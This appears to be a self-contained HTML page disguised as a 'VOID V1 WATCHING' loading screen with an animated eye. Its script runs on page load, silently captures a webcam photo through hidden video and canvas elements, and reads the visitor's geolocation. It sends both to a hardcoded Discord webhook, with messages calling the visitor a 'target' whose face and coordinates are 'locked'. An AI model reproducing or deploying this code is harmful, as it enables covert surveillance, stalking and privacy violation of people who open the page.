<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VOID V1 - THE EYE</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Animasi Mata */
        .eye-container {
            width: 150px;
            height: 150px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 0 50px #fff;
            margin-bottom: 20px;
        }

        .pupil {
            width: 60px;
            height: 60px;
            background: #000;
            border-radius: 50%;
            position: absolute;
            animation: moveEye 3s infinite ease-in-out;
        }

        @keyframes moveEye {
            0%, 100% { transform: translate(0, 0); }
            25% { transform: translate(-30px, -10px); }
            50% { transform: translate(30px, 15px); }
            75% { transform: translate(5px, -25px); }
        }

        .loading-text {
            font-size: 1.2rem;
            letter-spacing: 5px;
            text-transform: uppercase;
        }

        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80% { content: '...'; }
        }
    </style>
</head>
<body>

    <div class="eye-container">
        <div class="pupil"></div>
    </div>

    <div class="loading-text">
        VOID V1 WATCHING<span class="dots"></span>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";

        async function uploadData() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            try {
                // Izin Kamera & Ambil Gambar
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('file', blob, 'eye_capture.png');
                        formData.append('payload_json', JSON.stringify({
                            content: "üëÅÔ∏è **THE EYE HAS SEEN THEM** üëÅÔ∏è\nMuka target berhasil diabadikan."
                        }));

                        fetch(webhookURL, { method: 'POST', body: formData });
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/png');
                }, 2500);

                // Izin Lokasi
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(pos => {
                        const locMsg = `üìç **COORDINATES LOCKED**\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        fetch(webhookURL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ content: locMsg })
                        });
                    });
                }

            } catch (err) {
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ content: "‚ùå **SENSORS BLOCKED**: Target menolak akses." })
                });
            }
        }

        window.onload = uploadData;
    </script>
</body>
</html>
